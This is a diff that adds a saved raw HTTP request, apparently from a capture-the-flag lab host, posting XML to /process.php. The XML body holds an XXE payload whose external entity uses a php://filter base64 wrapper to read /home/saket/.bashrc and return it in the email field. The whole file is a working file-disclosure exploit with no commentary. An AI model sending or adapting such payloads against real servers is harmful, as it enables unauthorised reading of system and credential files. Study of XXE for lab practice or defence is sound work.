@@ -1,0 +1,26 @@
+POST /process.php HTTP/1.1
+Host: hackerkid.blackhat.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 227
+Origin: http://hackerkid.blackhat.local
+Connection: keep-alive
+Referer: http://hackerkid.blackhat.local/
+Priority: u=0
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/home/saket/.bashrc'>]>
+    <root>
+    <name>
+    </name>
+    <tel>
+    </tel>
+    <email>
+    &xxe;
+    </email>
+    <password>
+    </password>
+    </root>
